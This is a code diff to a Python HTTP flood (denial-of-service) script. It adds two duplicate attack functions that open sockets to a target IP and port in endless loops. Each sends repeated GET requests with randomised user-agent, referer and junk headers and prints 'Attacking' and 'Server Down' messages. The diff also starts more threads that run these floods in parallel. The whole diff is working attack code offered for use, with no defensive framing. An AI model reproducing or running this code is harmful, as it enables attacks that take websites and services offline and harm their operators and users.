@@ -268,6 +268,56 @@ def flooder():
     sock3[4] = str(random.randrange(18928))
     addres = sock3[0] + addr + sock3[1] + addr + sock3[2] + addr + sock3[3] + addr + sock4[4] + addr + "\r\n"
     return addres
+def start3():
+    global useragents, ref, acceptall, lolagent
+    hh = random._urandom(75006)
+    xx = int(0)
+    lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
+    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
+def start2():
+    global useragents, ref, acceptall, lolagent
+    hh = random._urandom(75006)
+    xx = int(0)
+    lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
+    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
 def start():
     global useragents, ref, acceptall, lolagent
     hh = random._urandom(75006)
@@ -296,4 +346,11 @@ def start():
 
 for x in range(thread):
     thred = threading.Thread(target=start)
+    thred2 = threading.Thread(target=start2)
+    thred3 = threading.Thread(target=start3)
+    thred2.start()
+    thred3.start()
     thred.start()
+for ty in range(15000):
+  thred2.join()
+  thred3.join()
